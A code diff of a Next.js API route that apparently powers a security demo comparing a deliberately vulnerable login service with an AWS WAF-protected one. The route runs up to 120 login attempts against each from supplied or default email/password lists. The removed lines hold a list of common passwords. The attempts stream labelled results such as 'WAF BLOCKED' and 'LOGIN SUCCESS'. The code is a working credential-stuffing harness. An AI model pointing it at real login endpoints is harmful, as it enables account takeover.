@@ -1,18 +1,19 @@
 import { NextRequest } from 'next/server';
+import { DEFAULT_CREDENTIALS, type Credential } from '@/lib/default-credentials';
+import { normalizeApiBaseUrl } from '@/lib/url-utils';
 
 export const dynamic = 'force-dynamic';
 
-const VULNERABLE_URL = process.env.VULNERABLE_API_URL || 'http://localhost:3000';
-const AWS_URL = process.env.AWS_API_URL || '';
-
-const PASSWORDS = [
-  'password', '123456', 'admin123', 'letmein', 'qwerty',
-  'welcome', 'monkey', 'dragon', 'master', 'abc123',
-  'pass1234', 'admin', 'iloveyou', 'sunshine', 'princess',
-  'football', 'shadow', 'superman', 'michael', 'baseball',
-  'trustno1', 'batman', 'access', 'hello123', 'charlie',
-  'donald', 'password1', 'qwerty123', 'p@ssw0rd', 'test1234',
-];
+const URL_MAP = {
+  manual: {
+    vulnerable: normalizeApiBaseUrl(process.env.VULNERABLE_API_URL || 'http://localhost:3000'),
+    aws: normalizeApiBaseUrl(process.env.AWS_API_URL || ''),
+  },
+  auto: {
+    vulnerable: normalizeApiBaseUrl(process.env.AUTO_VULNERABLE_API_URL || ''),
+    aws: normalizeApiBaseUrl(process.env.AUTO_AWS_API_URL || ''),
+  },
+};
 
 function sleep(ms: number) {
   return new Promise((r) => setTimeout(r, ms));
@@ -42,25 +43,31 @@ async function sendStageWithDelay(
   await sleep(STAGE_STEP_MS);
 }
 
-async function tryLogin(baseUrl: string, password: string, attempt: number) {
+async function tryLogin(baseUrl: string, email: string, password: string, attempt: number) {
   const start = Date.now();
   try {
     const res = await fetch(`${baseUrl}/api/auth/login`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ email: 'victim@demo.com', password }),
+      body: JSON.stringify({ email, password }),
       signal: AbortSignal.timeout(6000),
     });
     const latency = Date.now() - start;
-    const blocked = res.status === 429 || res.status === 403;
+
+    // CloudFront custom_error_response: WAF 403 → 200 + text/html (SPA index.html)
+    // Content-Type이 JSON이 아닌 200은 실제 로그인 성공이 아닌 CF 리다이렉트로 판정
+    const isJson = (res.headers.get('content-type') || '').includes('application/json');
+    const effectiveStatus = (res.status === 200 && !isJson) ? 403 : res.status;
+
+    const blocked = effectiveStatus === 429 || effectiveStatus === 403;
     const label = blocked
-      ? res.status === 429 ? 'RATE LIMITED' : 'WAF BLOCKED'
-      : res.status === 401
+      ? effectiveStatus === 429 ? 'RATE LIMITED' : 'WAF BLOCKED'
+      : effectiveStatus === 401
         ? 'REACHED (wrong pw)'
-        : res.status === 200
+        : effectiveStatus === 200
           ? 'LOGIN SUCCESS'
-          : `HTTP ${res.status}`;
-    return { attempt, status: res.status, latency, blocked, label };
+          : `HTTP ${effectiveStatus}`;
+    return { attempt, status: effectiveStatus, latency, blocked, label, email, password };
   } catch {
     return {
       attempt,
@@ -69,13 +76,29 @@ async function tryLogin(baseUrl: string, password: string, attempt: number) {
       blocked: false,
       label: 'CONNECTION ERROR',
       error: 'timeout_or_refused',
+      email,
+      password,
     };
   }
 }
 
-export async function GET(request: NextRequest) {
-  const url = new URL(request.url);
-  const count = Math.min(parseInt(url.searchParams.get('count') || '100'), 120);
+export async function POST(request: NextRequest) {
+  let credentials: Credential[] = DEFAULT_CREDENTIALS;
+  let mode: 'manual' | 'auto' = 'manual';
+  try {
+    const body = await request.json();
+    if (Array.isArray(body.credentials) && body.credentials.length > 0) {
+      credentials = body.credentials;
+    }
+    if (body.mode === 'auto') mode = 'auto';
+  } catch {
+    // body 없거나 파싱 실패 시 기본값 사용
+  }
+
+  const VULNERABLE_URL = URL_MAP[mode].vulnerable || 'http://localhost:3000';
+  const AWS_URL = URL_MAP[mode].aws;
+
+  const count = Math.min(credentials.length, 120);
 
   const encoder = new TextEncoder();
   const { readable, writable } = new TransformStream();
@@ -105,18 +128,20 @@ export async function GET(request: NextRequest) {
 
       for (let i = 0; i < count; i++) {
         const attempt = i + 1;
-        const password = PASSWORDS[i % PASSWORDS.length];
+        const { email, password } = credentials[i];
 
         const [vulnResult, awsResult] = await Promise.all([
-          tryLogin(VULNERABLE_URL, password, attempt),
+          tryLogin(VULNERABLE_URL, email, password, attempt),
           AWS_URL
-            ? tryLogin(AWS_URL, password, attempt)
+            ? tryLogin(AWS_URL, email, password, attempt)
             : Promise.resolve({
                 attempt,
                 status: -1,
                 latency: 0,
                 blocked: false,
                 label: 'AWS URL NOT CONFIGURED',
+                email,
+                password,
               }),
         ]);
 
